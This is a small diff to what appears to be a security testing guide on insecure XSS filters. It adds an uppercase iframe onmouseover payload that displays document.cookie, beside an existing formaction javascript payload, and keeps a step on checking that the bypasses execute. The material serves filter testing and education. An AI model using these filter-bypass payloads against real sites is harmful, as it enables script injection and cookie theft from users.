@@ -100,4 +100,8 @@ An insecure XSS filter occurs when an application fails to properly validate use
    ```
    <form><button formaction=JAVASCRIPT&colon;ALERT(1)>CLICKME
    ```
+   Iframe event based mayhem
+   ```
+   <IFRAME SRC=# ONMOUSEOVER="ALERT(DOCUMENT.COOKIE)"></IFRAME>
+   ```
 5. For validation purposes, ensure that the injected JavaScript successfully executes on the frontend (e.g., showing an alert box) and different bypass techniques successfully trigger the XSS, demonstrating the insecure filter
